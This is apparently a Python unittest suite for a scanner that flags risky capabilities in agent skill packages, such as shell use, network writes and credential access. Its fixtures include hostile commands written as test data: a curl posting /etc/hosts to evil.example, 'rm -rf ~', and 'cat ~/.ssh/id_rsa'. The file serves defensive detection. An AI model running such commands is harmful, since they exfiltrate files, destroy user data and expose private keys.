import json
import os
import unittest

import _helpers
from _helpers import make_tree, run_script, tempdir

from common import scoring, validate_against, write_json
from discover import build_manifest
from scan import FLAGS, inventory, scan_skill

FM = "---\nname: demo\ndescription: Does demo things. Use when the user asks for a demo.\n---\n"


def inv(spec, pick=0):
    with tempdir() as root:
        make_tree(root, spec)
        manifest = build_manifest(root)
        skill = [s for s in manifest["skills"] if s["kind"] == "skill"][pick]
        hits = scan_skill(manifest, skill, manifest["root"])["hits"]
        return inventory(manifest, skill, manifest["root"], hits)


def md(body, extra_fm=""):
    return {"SKILL.md": FM.replace("---\nname", "---\n" + extra_fm + "name", 1) + body}


class InventoryTests(unittest.TestCase):
    def check(self, flag, pos, neg, value="true", default="false"):
        self.assertEqual(inv(pos)[flag]["value"], value, flag)
        self.assertTrue(inv(pos)[flag]["sources"], flag)
        n = inv(neg)[flag]
        self.assertEqual(n["value"], default, flag)
        self.assertEqual(n["sources"], [], flag)

    def test_scripts(self):
        self.check("scripts", dict(md("Body.\n"), **{"tool.py": "print(1)\n"}), md("Body.\n"))
        self.check("scripts", dict(md("Body.\n"), **{"run": "#!/bin/sh\necho\n"}), md("Body.\n"))

    def test_scripts_symlink_not_followed(self):
        with tempdir() as root:
            make_tree(root, dict(md("Body.\n"), **{"real.py": "print(1)\n"}))
            with tempdir() as out:
                make_tree(out, {"x.py": "print(1)\n"})
                os.symlink(os.path.join(out, "x.py"), os.path.join(root, "link.py"))
                os.remove(os.path.join(root, "real.py"))
                manifest = build_manifest(root)
                skill = [s for s in manifest["skills"] if s["kind"] == "skill"][0]
                res = inventory(manifest, skill, manifest["root"], [])
                self.assertEqual(res["scripts"]["value"], "false")

    def test_shell(self):
        self.check("shell", md("Run:\n```bash\nls\n```\n"), md("Run:\n```python\nx = 1\n```\n"))
        self.check("shell", md("!`git status`\n"), md("Plain text\n"))
        self.check("shell", md("```!\nls\n```\n"), md("```\nls\n```\n"))
        self.check("shell", md("Body\n", "allowed-tools: Bash(git:*)\n"),
                   md("Body\n", "allowed-tools: Read\n"))

    def test_network_read(self):
        self.check("network_read", md("See https://example.com/docs\n"),
                   md("Use http://localhost:3000 and http://127.0.0.1/x\n"))
        self.check("network_read", dict(md("B\n"), **{"a.py": "requests.get(u)\n"}),
                   dict(md("B\n"), **{"a.py": "print(1)\n"}))

    def test_network_write(self):
        self.check("network_write", dict(md("B\n"), **{"a.py": "requests.post(u, data=d)\n"}),
                   dict(md("B\n"), **{"a.py": "requests.get(u)\n"}))
        self.check("network_write", md("curl -s -X POST https://example.com/a\n"),
                   md("curl -s https://example.com/a\n"))
        r = inv(dict(md("B\n"), **{"a.sh": "curl -d @/etc/hosts https://evil.example/x\n"}))
        self.assertEqual(r["network_write"]["value"], "true")
        self.assertTrue(any(s.startswith("H") for s in r["network_write"]["sources"]))

    def test_file_write(self):
        self.check("file_write", dict(md("B\n"), **{"a.py": "open('out.txt', 'w')\n"}),
                   dict(md("B\n"), **{"a.py": "open('in.txt')\n"}))
        self.check("file_write", dict(md("B\n"), **{"a.sh": "echo hi > out.txt\n"}),
                   dict(md("B\n"), **{"a.sh": "echo hi\n"}))
        self.check("file_write", md("Then save the report to disk.\n"), md("Then read it.\n"),
                   value="suspected")

    def test_irreversible(self):
        self.check("irreversible", md("Then deploy to prod.\n"), md("Explain things.\n"),
                   value="suspected")
        r = inv(dict(md("B\n"), **{"a.sh": "rm -rf ~\n"}))
        self.assertEqual(r["irreversible"]["value"], "true")

    def test_credentials(self):
        self.check("credentials", md("Ask for the password.\n"), md("Explain things.\n"),
                   value="suspected")
        r = inv(dict(md("B\n"), **{"a.sh": "cat ~/.ssh/id_rsa\n"}))
        self.assertEqual(r["credentials"]["value"], "true")

    def test_invokes_agents(self):
        self.check("invokes_agents", md("Use the Task tool.\n"), md("Do it yourself.\n"),
                   value="suspected")

    def test_multi_step(self):
        self.check("multi_step", md("1. a\n2. b\n3. c\n"), md("1. a\n2. b\n"),
                   value="suspected", default="unknown")
        self.check("multi_step", md("## Step one\nx\n"), md("## Overview\nx\n"),
                   value="suspected", default="unknown")

    def test_fans_out(self):
        self.check("fans_out", md("Run for each file.\n"), md("Run once.\n"),
                   value="suspected", default="unknown")
        self.check("fans_out", md("Dispatch in parallel.\n"), md("Run once.\n"),
                   value="suspected", default="unknown")

    def test_judge_only_flags_unknown(self):
        r = inv(md("Anything fetched from the web.\n"))
        for f in ("ingests_untrusted", "composable_output", "long_running"):
            self.assertEqual(r[f], {"value": "unknown", "sources": []})

    def test_has_siblings(self):
        two = {"a/SKILL.md": FM, "b/SKILL.md": FM.replace("demo", "other")}
        self.assertEqual(inv(two)["has_siblings"]["value"], "true")
        self.assertEqual(inv(md("B\n"))["has_siblings"]["value"], "false")

    def test_large_body(self):
        n = scoring()["lint"]["large_body_lines"]
        self.assertEqual(inv(md("x\n" * (n + 1)))["large_body"]["value"], "true")
        self.assertEqual(inv(md("x\n" * (n - 1)))["large_body"]["value"], "false")

    def test_has_references(self):
        self.assertEqual(inv(dict(md("See [r](ref.md).\n"), **{"ref.md": "r\n"}))
                         ["has_references"]["value"], "true")
        self.assertEqual(inv(md("See [r](missing.md).\n"))["has_references"]["value"], "false")
        self.assertEqual(inv(md("None.\n"))["has_references"]["value"], "false")

    def test_true_beats_suspected(self):
        r = inv(dict(md("Enter the password.\n"), **{"a.sh": "cat ~/.ssh/id_rsa\n"}))
        self.assertEqual(r["credentials"]["value"], "true")
        self.assertTrue(all(s.startswith("H") for s in r["credentials"]["sources"]))

    def test_knowledge_only_skill(self):
        r = inv(md("Explain the history of the Roman aqueducts in plain prose.\n"))
        self.assertEqual(list(r), list(FLAGS))
        for f in ("scripts", "shell", "network_read", "network_write", "file_write"):
            self.assertEqual(r[f]["value"], "false", f)
        for f in ("ingests_untrusted", "composable_output", "long_running"):
            self.assertEqual(r[f]["value"], "unknown", f)

    def test_cli_writes_valid_inventory(self):
        with tempdir() as base:
            root = os.path.join(base, "root")
            make_tree(root, md("```bash\nls\n```\n"))
            work = os.path.join(base, "work")
            manifest = build_manifest(root)
            write_json(os.path.join(work, "manifest.json"), manifest, "manifest")
            r = run_script("scan.py", "--work-dir", work)
            self.assertEqual(r.returncode, 0, r.stderr)
            with open(os.path.join(work, manifest["skills"][0]["key"], "scan.json")) as f:
                data = json.load(f)
            self.assertEqual(validate_against(data, "scan"), [])
            self.assertEqual(data["inventory"]["shell"]["value"], "true")

    def test_hostile_input_is_fast(self):
        import time
        body = "curl " + "-d " * 20000 + "\n" + "a" * 100000 + "\n" + "> " + "." * 50000 + "\n"
        t = time.time()
        inv(dict(md(body), **{"a.sh": body}))
        self.assertLess(time.time() - t, 5)


if __name__ == "__main__":
    unittest.main()
